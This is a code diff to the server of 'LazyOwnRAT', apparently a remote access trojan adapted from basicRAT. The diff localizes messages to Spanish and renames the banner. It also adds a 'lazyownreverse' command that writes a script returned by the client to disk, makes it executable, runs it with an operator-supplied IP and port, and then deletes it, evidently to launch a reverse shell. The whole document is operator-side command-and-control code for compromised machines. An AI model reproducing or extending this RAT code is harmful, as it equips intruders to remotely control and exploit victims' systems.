@@ -9,9 +9,9 @@ import threading
 from Crypto.Cipher import AES
 from Crypto.Random import get_random_bytes
 import binascii
+import subprocess
 
 def signal_handler(sig, frame):
-    
     print("\n [<-] Saliendo...")
     sys.exit(0)
 
@@ -33,7 +33,7 @@ def decrypt(ciphertext, key):
     return plaintext.rstrip(b'\0')
 
 def handle_client(conn, addr, key):
-    print(f'[+] Connection established with {addr}')
+    print(f'[+] Conexión establecida con {addr}')
     try:
         while True:
             cmd = input('LazyOwnRAT# ').strip()
@@ -51,7 +51,17 @@ def handle_client(conn, addr, key):
             if not data:
                 break
 
-            print(decrypt(data, key).decode('utf-8'))
+            result = decrypt(data, key).decode('utf-8')
+
+            if cmd.startswith('lazyownreverse'):
+                _, ip, port = cmd.split(' ')
+                with open('lazyownreverse.sh', 'w') as f:
+                    f.write(result)
+                subprocess.run(['chmod', '+x', 'lazyownreverse.sh'])
+                subprocess.run(['./lazyownreverse.sh', '--ip', ip, '--puerto', port])
+                os.remove('lazyownreverse.sh')
+            else:
+                print(result)
 
     except Exception as e:
         print(f'[e] Error: {e}')
@@ -59,7 +69,6 @@ def handle_client(conn, addr, key):
         conn.close()
 
 def main():
-    # Banner de la herramienta
     BANNER = """
     ██╗      █████╗ ███████╗██╗   ██╗ ██████╗ ██╗    ██╗███╗   ██╗
     ██║     ██╔══██╗╚══███╔╝╚██╗ ██╔╝██╔═══██╗██║    ██║████╗  ██║
@@ -71,7 +80,7 @@ def main():
     """    
     print(BANNER)
 
-    parser = argparse.ArgumentParser(description='basicRAT Server')
+    parser = argparse.ArgumentParser(description='LazyOwnRAT Server')
     parser.add_argument('--host', default='localhost', help='Host to bind the server')
     parser.add_argument('--port', type=int, default=1337, help='Port to bind the server')
     parser.add_argument('--key', required=True, help='Encryption key (hex encoded)')
